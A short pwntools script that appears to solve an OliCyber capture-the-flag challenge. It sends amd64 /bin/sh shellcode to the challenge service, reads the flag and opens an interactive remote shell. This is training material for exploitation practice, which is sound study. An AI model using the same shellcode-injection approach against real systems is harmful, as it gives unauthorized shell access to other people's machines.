from pwn import *

r = remote("software-20.challs.olicyber.it", 13003)


asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

leng = len(shellcode)
print(shellcode)
leng = str(leng)

r.sendline()
r.recvuntil(b"Shellcode size (max 4096): ")
r.sendline(leng.encode())
print("sended len")
r.recvuntil(b"Send me exactly 48 bytes: ")
r.sendline(shellcode)
print("shell sent")
r.sendline(b"cat flag")
r.interactive()